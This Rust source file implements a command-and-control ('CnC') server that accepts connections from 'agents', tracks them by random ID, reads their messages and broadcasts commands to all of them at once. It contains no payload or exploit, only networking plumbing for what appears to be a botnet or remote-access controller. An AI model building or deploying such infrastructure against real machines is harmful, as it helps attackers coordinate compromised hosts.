use std::collections::HashMap;
use std::io;
use tokio::io::{AsyncWriteExt};
use std::sync::Arc;
// use tokio::io::{AsyncWriteExt, Interest};
use tokio::net::TcpListener;
use tokio::sync::Mutex;

use rand::prelude::*;

use crate::socket::{SocketState, SocketStream};
pub struct Server {
    pub streams: Arc<Mutex<HashMap<i32, SocketStream>>>, // or agents
}

impl Server {
    pub fn new() -> Self {
        Self {
            streams: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    pub async fn assign_new_socket(&mut self, socket: SocketStream) {
        let streams = Arc::clone(&self.streams);
        let mut streams_lock = streams.lock().await;

        let new_socket_id = generate_random_num();
        
        streams_lock.insert(new_socket_id, socket);

        // FIRE HANDSHAKE SERVER_HELLO so we can keep on going from handle_msg.
        // let my_new_stream = Arc::clone(&streams_lock.get(&new_socket_id).unwrap().stream);
        // let mut my_new_lock = my_new_stream.lock().await;
        // my_new_lock.write_all(&b"HANDSHAKE".to_vec()).await.unwrap();
        // std::mem::drop(my_new_lock);

        self.read_new_socket(new_socket_id).await.unwrap();
    }

    pub async fn broadcast_command(&mut self, command: Vec<u8>) -> Result<(), Vec<i32>> {
        let mut failed_broadcasts: Vec<i32> = Vec::new();
        let streams = Arc::clone(&self.streams);
        let mut streams = streams.lock().await;
        for stream in &mut *streams {
            let res = stream.1.write_msg(&command).await;
            if res.is_err() {
                failed_broadcasts.push(*stream.0);
                continue;
            }
        }

        if failed_broadcasts.len() > 0 {
            Err(failed_broadcasts)
        } else {
            Ok(())
        }
    }

    pub async fn read_new_socket(&mut self, id: i32) -> io::Result<()> {
        // A loop which reads messages from the CnC
        // server.assign_new_stream(stream: SocketStream)
        let my_streams = Arc::clone(&self.streams);
        tokio::spawn(async move {
            loop {
                let mut streams = my_streams.lock().await;
                let socket = streams.get(&id).unwrap();
                let msg = socket.consume_message().await;

                match msg {
                    Err(e) if e.kind() == std::io::ErrorKind::ConnectionReset => {
                        println!("Agent disconnected");
                        // remove from hashmap
                        streams.remove(&id);
                        break;
                    }
                    Ok((msg, n_bytes)) => {
                        println!("{} -> {}", String::from_utf8(msg.clone()).unwrap(), n_bytes);
                        socket.handle_msg(msg).await;
                    }
                    _ => {}
                }
            }
        });
        Ok(())
    }
}

pub async fn start_cnc_server(ip: &str, port: u16, server: &Arc<Mutex<Server>>) -> io::Result<()> {
    let listener = TcpListener::bind(&format!("{}:{}", ip, port)).await?;
    let my_server = Arc::clone(server);

    tokio::spawn(async move {
        loop {
            let (socket, _) = listener.accept().await.unwrap();
            let socket = SocketStream::new(socket);
            let mut lock = my_server.lock().await;
            lock.assign_new_socket(socket).await;
        }
    });

    Ok(())
}

pub fn generate_random_num() -> i32 {
    let mut rng = rand::thread_rng();
    let mut nums: Vec<i32> = (1..100000).collect();
    nums.shuffle(&mut rng);
    *nums.get(0).unwrap()
}
